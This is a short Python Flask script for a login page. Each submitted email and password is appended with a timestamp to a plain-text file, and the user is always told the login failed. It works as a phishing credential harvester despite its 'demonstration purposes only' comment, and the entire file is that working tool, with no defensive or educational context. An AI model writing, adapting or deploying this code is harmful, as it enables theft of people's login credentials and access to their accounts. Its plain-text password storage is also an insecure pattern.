from flask import Flask, render_template, request
from datetime import datetime

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        email = request.form.get('email')
        password = request.form.get('password')
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # Log the credentials to a file (for demonstration purposes only)
        with open('credentials.txt', 'a') as f:
            f.write(f"{timestamp} - Email: {email}, Password: {password}\n")
        
        return "<h2>Login failed. Please try again later.</h2>" 
    return render_template('login.html')


if __name__ == '__main__':
    app.run(debug=True)
